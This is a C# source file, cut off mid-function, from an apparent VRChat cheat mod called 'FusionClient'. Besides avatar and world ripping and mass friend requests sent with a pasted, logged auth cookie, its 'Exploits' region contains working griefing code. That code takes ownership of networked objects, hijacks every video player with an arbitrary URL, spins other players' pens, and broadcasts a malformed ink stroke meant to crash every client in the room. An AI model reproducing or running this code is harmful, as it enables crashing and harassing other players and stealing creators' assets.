using FC.Utils;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using RealisticEyeMovements;
using RootMotion.FinalIK;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using FusionClient.Utils;
using Transmtn.DTO;
using Transmtn.DTO.Notifications;
using UnhollowerBaseLib;
using UnityEngine;
using UnityEngine.UI;
using VRC;
using VRC.Core;
using VRC.DataModel;
using VRC.Networking;
using VRC.SDK3.Components;
using VRC.SDKBase;
using VRC.Udon;
using VRC.Udon.Common.Interfaces;
using VRC.UI;
using IEnumerator = System.Collections.IEnumerator;
using Player = VRC.Player;
using UnityEngine.Rendering.PostProcessing;
using VRC.Management;
using FC;
using TMPro;
using FusionClient.Core;
using FusionClient.Utils.VRChat;

namespace FusionClient.Modules
{
    public class ModulesFunctions : MelonMod
    {
        #region Self

        #region ChangeIntoAviById

        public static PageAvatar pageAvatar;

        public static PageAvatar GetPageAvatar()
        {
            if (pageAvatar == null)
            {
                pageAvatar = GameObject.Find("UserInterface/MenuContent/Screens/Avatar").GetComponent<PageAvatar>();
            }

            return pageAvatar;
        }

        public static void ChangeAvatar(string avatarID)
        {
            new ApiAvatar() { id = avatarID }.Get(new System.Action<ApiContainer>(x =>
            {
                GetPageAvatar().field_Public_SimpleAvatarPedestal_0.field_Internal_ApiAvatar_0 = x.Model.Cast<ApiAvatar>();
                GetPageAvatar().ChangeToSelectedAvatar();
            }),
            new System.Action<ApiContainer>(x =>
            {
                Logs.Log($"Failed to switch to avatar: {avatarID} ({x.Error})", ConsoleColor.Cyan);
            }), null, false);
        }

        #endregion ChangeIntoAviById

        #region MassInvite

        public static void SendInvite(string Message, string UserID, string WorldID, string InstanceID)
        {
            //VRCWebSocketsManager.field_Private_Static_VRCWebSocketsManager_0.prop_Api_0.PostOffice.Send(Invite.Create(UserID, Message, new Location(WorldID, new Instance(InstanceID, "", "", "", "", false)), Message));
            MonoBehaviourPublicObApAcApStAcBoStBoObUnique.field_Private_Static_MonoBehaviourPublicObApAcApStAcBoStBoObUnique_0.prop_Api_0.PostOffice.Send(Invite.Create(UserID, Message, new Location(WorldID, new Instance(InstanceID, "", "", "", "", false)), Message));
        }

        #endregion MassInvite

        #region DownloadVRCA

        internal static void DownloadVRCA(ApiAvatar avatar)
        {
            
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("Accept", "application/zip");
                webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(AviDownloadPopUp);
                Logs.Log("Started Downloading Avi! Please Wait...", ConsoleColor.Cyan);
                Logs.Hud("<color=cyan>FusionClient</color> | Started Downloading Avi! Please Wait...");
                webClient.DownloadFile(new Uri(avatar.assetUrl), ModFiles.VRCAPath + $"\\FusionClient-{avatar.name}-{avatar.authorName}-{avatar.version}.vrca");
            }
            catch (Exception e)
            {
                Logs.Log("Avi Download Failed! | Error Message: " + e.Message, ConsoleColor.Red);
                Logs.Hud("<color=cyan>FusionClient</color> | Avi Download Failed! | Error Message: " + e.Message);
            }
        }

        internal static void DownloadAviImage(ApiAvatar avatar)
        {
            
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("Accept", "application/zip");
                webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                webClient.DownloadFile(new Uri(avatar.imageUrl), ModFiles.VRCAPath + $"\\FusionClient-{avatar.name}-{avatar.authorName}-{avatar.version}.png");
            }
            catch (Exception e)
            {
                Logs.Log("Avi Download Failed! | Error Message: " + e.Message, ConsoleColor.Red);
                Logs.Hud("<color=cyan>FusionClient</color> | Avi Download Failed! | Error Message: " + e.Message);
            }
        }

        private static void AviDownloadPopUp(object sender, AsyncCompletedEventArgs e)
        {
            Logs.Hud("<color=cyan>FusionClient</color> Done: Avi Is Done Downloading");
        }

        #endregion DownloadVRCA

        #region HeadFliper

        public static NeckRange RotationSave;

        public static void HeadFlipper(bool state)
        {
            
            if (state)
            {
                RotationSave = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponent<GamelikeInputController>().field_Protected_NeckMouseRotator_0.field_Public_NeckRange_0;
                VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponent<GamelikeInputController>().field_Protected_NeckMouseRotator_0.field_Public_NeckRange_0 = new NeckRange(float.MinValue, float.MaxValue, 0f);
            }
            else
            {
                VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponent<GamelikeInputController>().field_Protected_NeckMouseRotator_0.field_Public_NeckRange_0 = RotationSave;
            }
        }

        #endregion HeadFliper

        #region Fps Uncap

        internal static void FPSUnCap()
        {
            if (Config.Main.FpsUncap)
            {
                Application.targetFrameRate = 90;
            }
            else
            {
                if (!Application.isFocused)
                {
                    Application.targetFrameRate = 90;
                }
                Application.targetFrameRate = 250;
            }
        }

        #endregion

        #region Hide Self

        public static bool HideSelfBool = false;

        internal static IEnumerator HideSelf()
        {
            while (HideSelfBool)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.gameObject.SetActive(true);
                        GameObject.Find("/UserInterface/MenuContent/Screens/Avatar/AvatarPreviewBase").SetActive(true);
                        HideSelfBool = false;
                    }
                        PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.gameObject.SetActive(false);
                        GameObject.Find("/UserInterface/MenuContent/Screens/Avatar/AvatarPreviewBase").SetActive(false);
                }
                catch { }
                yield return new WaitForSecondsRealtime(1);
            }
            yield break;
        }


        #endregion

        #endregion Self

        //---------------------------------------------------------------------------------------------------------------------------

        #region World

        #region PostProcessing

        internal static void PostProcessing(bool state)
        {
            for (int i = 0; i < Camera.allCameras.Count; i++)
            {
                Camera camera = Camera.allCameras[i];
                bool flag = camera.GetComponent<PostProcessLayer>() != null;
                bool flag2 = flag;
                if (flag2)
                {
                    bool flag3 = !state != camera.GetComponent<PostProcessLayer>().enabled;
                    bool flag4 = flag3;
                    if (flag4)
                    {
                        camera.GetComponent<PostProcessLayer>().enabled = !state;
                    }
                }
            }
        }


        #endregion

        #region No World Portals

        internal static void AntiWorldPortals(bool state)
        {
            Il2CppArrayBase<VRCSDK2.VRC_PortalMarker> il2CppArrayBase = Resources.FindObjectsOfTypeAll<VRCSDK2.VRC_PortalMarker>();
            for (int i = 0; i < il2CppArrayBase.Count; i++)
            {
                VRCSDK2.VRC_PortalMarker VRC_PortalMarker = il2CppArrayBase[i];
                bool flag = !(VRC_PortalMarker == null);
                if (flag)
                {
                    bool flag2 = VRC_PortalMarker.gameObject.active == !state;
                    if (flag2)
                    {
                        VRC_PortalMarker.gameObject.SetActive(state);
                    }
                }
            }
            Il2CppArrayBase<VRC.SDK3.Components.VRCPortalMarker> il2CppArrayBase2 = Resources.FindObjectsOfTypeAll<VRC.SDK3.Components.VRCPortalMarker>();
            for (int j = 0; j < il2CppArrayBase2.Count; j++)
            {
                VRC.SDK3.Components.VRCPortalMarker VRCPortalMarker = il2CppArrayBase2[j];
                bool flag3 = !(VRCPortalMarker == null);
                if (flag3)
                {
                    bool flag4 = VRCPortalMarker.gameObject.active == !state;
                    if (flag4)
                    {
                        VRCPortalMarker.gameObject.SetActive(state);
                    }
                }
            }
        }

        #endregion

        #region AntiVP

        internal static void AntiVideoplayer(bool state)
        {
            Il2CppArrayBase<VRCSDK2.VRC_SyncVideoPlayer> il2CppArrayBase = Resources.FindObjectsOfTypeAll<VRCSDK2.VRC_SyncVideoPlayer>();
            for (int i = 0; i < il2CppArrayBase.Count; i++)
            {
                VRCSDK2.VRC_SyncVideoPlayer vrc_SyncVideoPlayer = il2CppArrayBase[i];
                bool flag = !(vrc_SyncVideoPlayer == null);
                if (flag)
                {
                    bool flag2 = vrc_SyncVideoPlayer.gameObject.active == !state;
                    if (flag2)
                    {
                        vrc_SyncVideoPlayer.gameObject.SetActive(state);
                    }
                }
            }
            Il2CppArrayBase<VRC.SDK3.Video.Components.VRCUnityVideoPlayer> il2CppArrayBase2 = Resources.FindObjectsOfTypeAll<VRC.SDK3.Video.Components.VRCUnityVideoPlayer>();
            for (int j = 0; j < il2CppArrayBase2.Count; j++)
            {
                VRC.SDK3.Video.Components.VRCUnityVideoPlayer vrcunityVideoPlayer = il2CppArrayBase2[j];
                bool flag3 = !(vrcunityVideoPlayer == null);
                if (flag3)
                {
                    bool flag4 = vrcunityVideoPlayer.gameObject.active == !state;
                    if (flag4)
                    {
                        vrcunityVideoPlayer.gameObject.SetActive(state);
                    }
                }
            }
        }

        #endregion AntiVP

        #region NoPickUps

        internal static void NoPickUps(bool state)
        {
            
            VRC_Pickup[] array = Resources.FindObjectsOfTypeAll<VRC_Pickup>().ToArray<VRC_Pickup>();
            for (int i = 0; i < array.Length; i++)
            {
                bool flag = array[i].gameObject.layer == 13;
                if (flag)
                {
                    array[i].pickupable = state;
                }
            }
            VRC_Pickup[] array2 = Resources.FindObjectsOfTypeAll<VRC_Pickup>().ToArray<VRC_Pickup>();
            for (int j = 0; j < array2.Length; j++)
            {
                bool flag2 = array2[j].gameObject.layer == 13;
                if (flag2)
                {
                    array2[j].pickupable = state;
                }
            }
            VRCPickup[] array3 = Resources.FindObjectsOfTypeAll<VRCPickup>().ToArray<VRCPickup>();
            for (int k = 0; k < array3.Length; k++)
            {
                bool flag3 = array3[k].gameObject.layer == 13;
                if (flag3)
                {
                    array3[k].pickupable = state;
                }
            }
        }

        #endregion NoPickUps

        #region OptMirrors

        internal static void OptimizeMirrors(bool state)
        {
            
            {
                if (state)
                {
                    bool flag = true;
                    MirrorReflection[] array = UnityEngine.Object.FindObjectsOfType<MirrorReflection>();
                    LayerMask layerMask = default(LayerMask);
                    layerMask.value = (flag ? 263680 : -1025);
                    for (int i = 0; i < array.Length; i++)
                    {
                        array[i].field_Public_LayerMask_0 = layerMask;
                    }
                    VRC_MirrorReflection[] array2 = UnityEngine.Object.FindObjectsOfType<VRC_MirrorReflection>();
                    for (int j = 0; j < array2.Length; j++)
                    {
                        array2[j].m_ReflectLayers = layerMask;
                    }
                    VRC_MirrorReflection[] array3 = UnityEngine.Object.FindObjectsOfType<VRC_MirrorReflection>();
                    for (int k = 0; k < array3.Length; k++)
                    {
                        array3[k].m_ReflectLayers = layerMask;
                    }
                }
                else
                {
                    bool flag = true;
                    MirrorReflection[] array = UnityEngine.Object.FindObjectsOfType<MirrorReflection>();
                    LayerMask layerMask = default(LayerMask);
                    layerMask.value = (flag ? 8676097 : -1025);
                    for (int i = 0; i < array.Length; i++)
                    {
                        array[i].field_Public_LayerMask_0 = layerMask;
                    }
                    VRC_MirrorReflection[] array2 = UnityEngine.Object.FindObjectsOfType<VRC_MirrorReflection>();
                    for (int j = 0; j < array2.Length; j++)
                    {
                        array2[j].m_ReflectLayers = layerMask;
                    }
                    VRC_MirrorReflection[] array3 = UnityEngine.Object.FindObjectsOfType<VRC_MirrorReflection>();
                    for (int k = 0; k < array3.Length; k++)
                    {
                        array3[k].m_ReflectLayers = layerMask;
                    }
                }
            }
        }

        #endregion OptMirrors

        #region TogglePickups

        public static VRC_Pickup[] cachedPickups;

        internal static void TogglePickups(bool state)
        {
            VRC_Pickup[] array = Resources.FindObjectsOfTypeAll<VRC_Pickup>().ToArray<VRC_Pickup>();
            for (int i = 0; i < array.Length; i++)
            {
                bool flag = array[i].gameObject.layer == 13;
                if (flag)
                {
                    array[i].gameObject.SetActive(state);
                }
            }
            VRC_Pickup[] array2 = Resources.FindObjectsOfTypeAll<VRC_Pickup>().ToArray<VRC_Pickup>();
            for (int j = 0; j < array2.Length; j++)
            {
                bool flag2 = array2[j].gameObject.layer == 13;
                if (flag2)
                {
                    array2[j].gameObject.SetActive(state);
                }
            }
            VRCPickup[] array3 = Resources.FindObjectsOfTypeAll<VRCPickup>().ToArray<VRCPickup>();
            for (int k = 0; k < array3.Length; k++)
            {
                bool flag3 = array3[k].gameObject.layer == 13;
                if (flag3)
                {
                    array3[k].gameObject.SetActive(state);
                }
            }
        }

        #endregion TogglePickups

        #region DownloadVRCW

        internal static void DownloadVRCW(ApiWorld world)
        {
            
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("Accept", "application/zip");
                webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(WorldDownloadPopUp);
                Logs.Log("Started Downloading World! Please Wait...", ConsoleColor.Cyan);
                Logs.Hud("<color=cyan>FusionClient</color> | Started Downloading World! Please Wait...");
                webClient.DownloadFile(new Uri(world.assetUrl), ModFiles.VRCWPath + $"\\FusionClient-{world.name}-{world.authorName}-{world.version}.vrcw");
            }
            catch (Exception e)
            {
                Logs.Log("World Download Failed! | Error Message: " + e.Message, ConsoleColor.Red);
                Logs.Hud("<color=cyan>FusionClient</color> | World Download Failed! | Error Message: " + e.Message);
            }
        }

        internal static void DownloadWorldImage(ApiWorld world)
        {
            
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("Accept", "application/zip");
                webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                webClient.DownloadFile(new Uri(world.imageUrl), ModFiles.VRCWPath + $"\\FusionClient-{world.name}-{world.authorName}-{world.version}.png");
            }
            catch (Exception e)
            {
                Logs.Log("World Download Failed! | Error Message: " + e.Message, ConsoleColor.Red);
                Logs.Hud("<color=cyan>FusionClient</color> | World Download Failed! | Error Message: " + e.Message);
            }
        }

        private static void WorldDownloadPopUp(object sender, AsyncCompletedEventArgs e)
        {
            Logs.Hud("<color=cyan>FusionClient</color> | World Donw Downloading");
            Logs.Log("World Done Downloading", ConsoleColor.Red);
        }

        #endregion DownloadVRCW

        #region JoinRoom

        public static void JoinRoom(string ID)
        {
            
            try
            {
                if (!ID.StartsWith("wrld_"))
                {
                    PopupUtils.HideCurrentPopUp();
                    Logs.Log("[Worlds] That is not a valid world id!", ConsoleColor.Red);
                    Logs.Hud("<color=cyan>FusionClient</color> | That is not a valid world id!");
                }
                else
                {
                    PopupUtils.HideCurrentPopUp();
                    Logs.Log($"[Worlds] Going to [{ID}]", ConsoleColor.Cyan);
                    new WaitForEndOfFrame();
                    Networking.GoToRoom(ID);
                    new PortalInternal().Method_Private_Void_String_String_PDM_0(ID, null);
                }
            }
            catch { }
        }

        #endregion JoinRoom

        #region DelPortals

        public static void DeletePortals()
        {
            
            int PortalDeleteCount = 0;
            PortalTrigger[] array = Resources.FindObjectsOfTypeAll<PortalTrigger>();
            MonoBehaviourPublicINetworkIDInObDoNu1InInUnique[] array2 = Resources.FindObjectsOfTypeAll<MonoBehaviourPublicINetworkIDInObDoNu1InInUnique>();
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i].gameObject.activeInHierarchy && !(array[i].gameObject.GetComponentInParent<VRC.SDKBase.VRC_PortalMarker>() != null))
                {
                    UnityEngine.Object.Destroy(array[i].gameObject);
                    PortalDeleteCount++;
                }
            }
            PortalDeleteCount = 0;
            foreach (var p in array2)
            {
                UnityEngine.Object.Destroy(p);
                PortalDeleteCount++;
            }
            if (Config.Main.AutoPortalDelete)
            {
            }
            else
            {
                Logs.Log($"Deleted {PortalDeleteCount} Portals!", ConsoleColor.Cyan);
                Logs.Hud($"<color=cyan>FusionClient</color> | Deleted {PortalDeleteCount} Portals!");
            }
            PortalDeleteCount = 0;
        }

        public static IEnumerator Loop()
        {
            for (; ; )
            {
                if (Config.Main.AutoPortalDelete)
                {
                    DeletePortals();
                }
                if (Config.Main.PortalTimeReset)
                {
                    ResetTime();
                }
                yield return new WaitForSeconds(2);
            }
        }

        public static void ResetTime()
        {
            SetPortalTime(30f);
        }

        #endregion DelPortals

        #region Drop Portal To WorldID

        internal static void PortalToWorld()
        {
            PopupUtils.InputPopup("Okay", "Wrld_00000_00000_0000_000_0", delegate (string s)
            {
                MiscUtils.DropPortal(s);
                PopupUtils.HideCurrentPopUp();
            });
        }

        #endregion

        #region CopyWorldId

        public static string CopyWorldID()
        {
            return WorldUtils.GetFullID();
        }

        #endregion CopyWorldId

        #region ToggleSeats

        internal static void ToggleSeats(bool state)
        {
            Il2CppArrayBase<VRC.SDKBase.VRCStation> il2CppArrayBase = Resources.FindObjectsOfTypeAll<VRC.SDKBase.VRCStation>();
            for (int i = 0; i < il2CppArrayBase.Count; i++)
            {
                VRC.SDKBase.VRCStation vrcstation = il2CppArrayBase[i];
                bool flag = !(vrcstation == null) && vrcstation.gameObject.active == !state;
                if (flag)
                {
                    vrcstation.gameObject.SetActive(state);
                }
            }
        }

        #endregion ToggleSeats

        #region FriendEveryone

        public static List<string> FriendList;

        public static async Task FriendEveryone(string AuthCookie)
        {
            if (File.Exists("Fusion Client/Misc/FriendList.txt")) FriendList = File.ReadAllLines("Fusion Client/Misc/FriendList.txt").ToList<string>();
            var AuthToken = AuthCookie.Trim();
            Logs.Log($"Logged to the API with: {AuthToken}", ConsoleColor.Cyan);
            foreach (var Friend in FriendList)
            {
                if (!APIUser.CurrentUser.friendIDs.Contains(Friend))
                {
                    var handler = new HttpClientHandler
                    {
                        UseCookies = false
                    };

                    var httpClient = new HttpClient(handler);

                    var request = new HttpRequestMessage();
                    {
                        request.Headers.Add("User-Agent", "Other");
                        request.Method = new HttpMethod("POST");
                        request.RequestUri = new Uri($"https://api.vrchat.cloud/api/1/user/{Friend}/friendRequest?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26");
                    }

                    request.Headers.TryAddWithoutValidation("Cookie", "auth=" + AuthToken);
                    var response = await httpClient.SendAsync(request);
                    string content = await response.Content.ReadAsStringAsync();
                    if (content.ToLower().Contains("error"))
                    {
                        Logs.Log($"Couldn't add: {Friend}", ConsoleColor.Red);
                        Logs.Log(content, ConsoleColor.Cyan);
                    }
                    else
                    {
                        Logs.Log($"Added: {Friend}", ConsoleColor.Cyan);
                        // FriendList.Remove(Friend);
                        await Task.Delay(1000);
                    }
                }
                else Logs.Log($"{Friend} is already your friend.", ConsoleColor.Red);
            }
        }

        #endregion FriendEveryone

        #region ReloadAvis

        internal static void ReloadAvatar(VRCPlayer player)
        {
            if (!(VRCPlayer.field_Internal_Static_VRCPlayer_0 == null) && !(player == null))
            {
                player.Method_Public_Void_Boolean_0();
            }
        }

        #endregion ReloadAvis

        #region FlashLight

        internal static GameObject Flashlight;

        internal static void FlashLightEnable()
        {
                Flashlight = GameObject.CreatePrimitive(0);
                Flashlight.gameObject.transform.localScale = new Vector3(0.001f, 0.001f, 0.001f);
                Flashlight.gameObject.AddComponent<Light>().range = 25f;
                Flashlight.gameObject.transform.SetParent(PlayerUtils.GetCurrentUser().transform);
        }

        internal static void FlashLightDisable()
        {
                UnityEngine.Object.Destroy(Flashlight.gameObject);
        }

        #endregion

        #region Force World Owner

        internal static bool FWO;

        internal static IEnumerator ForceWorldOwner()
        {
            while (FWO)
            {
                if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                {
                    FWO = false;
                }
                PlayerUtils.GetCurrentUser().GetComponent<VRC.Player>().field_Private_APIUser_0.displayName = $"{WorldUtils.GetCurrentWorld().authorName}";
                yield return new WaitForSecondsRealtime(4);
            }
            yield break;
        }

        #endregion

        #endregion World

        //----------------------------------------------------------------------------------------------------------------------------

        #region Exploits

        #region Colider Hider

        private static Transform head;
        private static VRC_AnimationController animController;
        //private static VRCVrIkController ikController;
        private static VRCVrIkCalibrator ikController;
        private static bool state;
        private static bool changed;

        public static void ColliderHider(bool state)
        {
            VRCPlayer field_Internal_Static_VRCPlayer_ = VRCPlayer.field_Internal_Static_VRCPlayer_0;
            if (((field_Internal_Static_VRCPlayer_ != null) ? field_Internal_Static_VRCPlayer_.transform : null) == null)
            {
                return;
            }
            if (head == null)
            {
                head = VRCVrCamera.field_Private_Static_VRCVrCamera_0.transform.parent;
            }
            if (animController == null)
            {
                animController = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRC_AnimationController>();
            }
            if (ikController == null)
            {
                //ikController = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRCVrIkController>();
                ikController = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRCVrIkCalibrator>();
            }
            VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position += new Vector3(0f, (float)(state ? -4 : 4), 0f);
            animController.field_Private_Boolean_0 = !state;
            MelonCoroutines.Start(ToggleIKController());
            if (state)
            {
                if (!Config.Main.Flight)
                {
                    Flight.FlyOn();
                    changed = true;
                }
                else
                {
                    changed = false;
                }
                head.localPosition += new Vector3(0f, 4f / head.parent.transform.localScale.y, 0f);
                return;
            }
            head.localPosition = Vector3.zero;
            if (changed)
            {
                Flight.FlyOff();
            }
        }

        private static IEnumerator ToggleIKController()
        {
            if (state)
            {
                yield return new WaitForSeconds(2f);
            }
            else
            {
                yield return null;
            }
            //ikController.field_Private_Boolean_0 = !state;
            ikController.field_Internal_Transform_0.gameObject.active = !state;
            yield break;
        }

        #endregion Colider Hider

        #region Pedestal Changer

        public static void ChangePedestals(string AviId)
        {
            if (WorldUtils.GetSDKType() == "SDK2")
            {
                foreach (var cachedPedestals in UnityEngine.Object.FindObjectsOfType<VRC_AvatarPedestal>())
                {
                    Networking.SetOwner(Networking.LocalPlayer, cachedPedestals.gameObject);
                    Networking.RPC(RPC.Destination.All, cachedPedestals.gameObject, "SwitchAvatar", new Il2CppSystem.Object[]
                    {
                    AviId
                    });
                }
            }
            else
            {
                foreach (var cachedPedestals in UnityEngine.Object.FindObjectsOfType<VRCAvatarPedestal>())
                {
                    Networking.SetOwner(Networking.LocalPlayer, cachedPedestals.gameObject);
                    Networking.RPC(RPC.Destination.All, cachedPedestals.gameObject, "SwitchAvatar", new Il2CppSystem.Object[]
                    {
                    AviId
                    });
                }
            }
        }

        #endregion pedestal Changer

        #region Respawn Pickups

        public static void RespawnPickups()
        {
            Il2CppArrayBase<VRC_Pickup> list = UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Pickup>();
            for (int i = 0; i < list.Count; i++)
            {
                VRC_Pickup vrc_Pickup = list[i];
                VRC.SDKBase.Networking.LocalPlayer.TakeOwnership(vrc_Pickup.gameObject);
                vrc_Pickup.transform.position = new Vector3(0f, -10000000f, 0f);
            }
        }

        #endregion Respawn Pickups

        #region VidPlayer Crash

        public static bool OverrideVideoPlayers(string url)
        {
            string URLSanitised = url.Trim();

            if (string.IsNullOrEmpty(URLSanitised) == true)
            {
                PopupUtils.InformationAlert("FusionClient\nURL Invalid Please Change Url In Settings", 5);

                return false;
            }
            if (url == "")
            {
                Logs.Log("URL Is Null!", ConsoleColor.Cyan);
                Logs.Hud("<color=cyan>FusionClient</color> | URL Is Null!");
                return false;
            }
            foreach (SyncVideoPlayer syncVideoPlayer in UnityEngine.Object.FindObjectsOfType<SyncVideoPlayer>())
            {
                if (syncVideoPlayer)
                {
                    VRC.SDKBase.Networking.LocalPlayer.TakeOwnership(syncVideoPlayer.gameObject);
                    VRCSDK2.VRC_SyncVideoPlayer field_Private_VRC_SyncVideoPlayer_ = syncVideoPlayer.field_Private_VRC_SyncVideoPlayer_0;
                    field_Private_VRC_SyncVideoPlayer_.Stop();
                    field_Private_VRC_SyncVideoPlayer_.Clear();
                    field_Private_VRC_SyncVideoPlayer_.AddURL(url);
                    field_Private_VRC_SyncVideoPlayer_.Next();
                    field_Private_VRC_SyncVideoPlayer_.Play();
                }
            }
            foreach (SyncVideoStream syncVideoStream in UnityEngine.Object.FindObjectsOfType<SyncVideoStream>())
            {
                if (syncVideoStream)
                {
                    VRC.SDKBase.Networking.LocalPlayer.TakeOwnership(syncVideoStream.gameObject);
                    VRCSDK2.VRC_SyncVideoStream field_Private_VRC_SyncVideoStream_ = syncVideoStream.field_Private_VRC_SyncVideoStream_0;
                    field_Private_VRC_SyncVideoStream_.Stop();
                    field_Private_VRC_SyncVideoStream_.Clear();
                    field_Private_VRC_SyncVideoStream_.AddURL(url);
                    field_Private_VRC_SyncVideoStream_.Next();
                    field_Private_VRC_SyncVideoStream_.Play();
                }
            }
            foreach (VRCUrlInputField vrcurlInputField in UnityEngine.Object.FindObjectsOfType<VRCUrlInputField>())
            {
                if (vrcurlInputField)
                {
                    vrcurlInputField.text = url;
                    vrcurlInputField.onEndEdit.Invoke(url);
                }
            }
            return true;
        }

        #endregion VidPlayer Crash

        #region Pen Exploit

        public static List<string> PenNames = new List<string>()
        {
            "pen",
            "pensel",
            "marker",
            "grip",
            "QvPen",
            "Stylus"
        };

        public static void TakeOwner(GameObject gameObject)
        {
            foreach (VRC_Pickup vrc_Pickup in UnityEngine.Object.FindObjectsOfType<VRC_Pickup>())
            {
                Networking.SetOwner(Networking.LocalPlayer, vrc_Pickup.gameObject);
            }
        }

        public static Vector3 PosLocal;

        public static IEnumerator Tornado()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                foreach (var Pickup in AllPickups)
                {
                    foreach (var PenName in PenNames)
                    {
                        if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                        {
                            TakeOwner(Pickup.gameObject);
                            Pickup.Drop();
                            var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                            var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            yield return new WaitForSeconds(0.2f);
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            yield return new WaitForSeconds(0.2f); //Figured out that you need a delay or else the use down rpc send before all the OnPickup events are sent and it won't work
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown(); //But calling it only once and it won't stop drawing until it's dropped or useup so it's not sending any RPC and not causing lags
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                            Pickup.transform.position = PosLocal;
                        }
                    }
                }
                float a = 0f;
                float b = 0f;
                float y = 0.2f;
                for (int i = 0; i < 50; i++)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        foreach (var PenName in PenNames)
                        {
                            if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                            {
                                yield return new WaitForSeconds(0.001f);
                                float CircleSpeed = 20;
                                float alpha = 0f;
                                Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                                for (int x = 0; x < 95; x++)
                                {
                                    alpha += Time.deltaTime * CircleSpeed;
                                    Pickup.transform.position = new Vector3(PosLocal.x + a * (float)System.Math.Cos(alpha), PosLocal.y + y, PosLocal.z + b * (float)System.Math.Sin(alpha));
                                    yield return new WaitForSeconds(0.001f);
                                }
                                a += 0.03f;
                                b += 0.03f;
                                if (y < 5)
                                {
                                    Pickup.transform.position = PosLocal;
                                    y += 0.03f;
                                }
                            }
                        }
                    }
                }
            }
        }

        #endregion Pen Exploit

        #region Pen Crash

        public static void PenCrash()
        {
            try
            {
                if (WorldUtils.GetSDK2Descriptor())
                {
                    VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.ColorSerializer color = default(VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.ColorSerializer);
                    VRC.SDK.Internal.Whiteboard.Marker marker = GameObject.FindObjectOfType<VRC.SDK.Internal.Whiteboard.Marker>();
                    Il2CppStructArray<VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.Vector3Serializer> positions = new Il2CppStructArray<VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.Vector3Serializer>(500L);
                    VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.InkStroke inkStroke = new VRC.SDK.Internal.Whiteboard.VRC_Presentation_Utils.InkStroke
                    {
                        Artist = new Il2CppSystem.Random().Next(int.MaxValue),
                        _artistId = new Il2CppSystem.Random().Next(int.MaxValue),
                        Color = new Color(10f, 10f, 10f, 1f),
                        Id = new Il2CppSystem.Random().Next(int.MaxValue),
                        Length = new Il2CppSystem.Random().Next(int.MaxValue),
                        _strokeId = new Il2CppSystem.Random().Next(int.MaxValue),
                        _positions = positions,
                        _color = color
                    };
                    VRC.SDKBase.VRC_EventHandler.VrcEvent vrcEvent = new VRC.SDKBase.VRC_EventHandler.VrcEvent
                    {
                        EventType = VRC.SDKBase.VRC_EventHandler.VrcEventType.SendRPC,
                        Name = "SendRPC",
                        ParameterString = "ReceiveStroke",
                        ParameterObject = marker.gameObject,
                        ParameterBytes = VRC.SDKBase.Networking.EncodeParameters(new Il2CppSystem.Object[]
                        {
                inkStroke
                        })
                    };
                    VRC.SDKBase.Networking.SceneEventHandler.TriggerEvent(vrcEvent, VRC.SDKBase.VRC_EventHandler.VrcBroadcastType.Always, VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_Player_0.gameObject, 0f);
                }
                else
                {
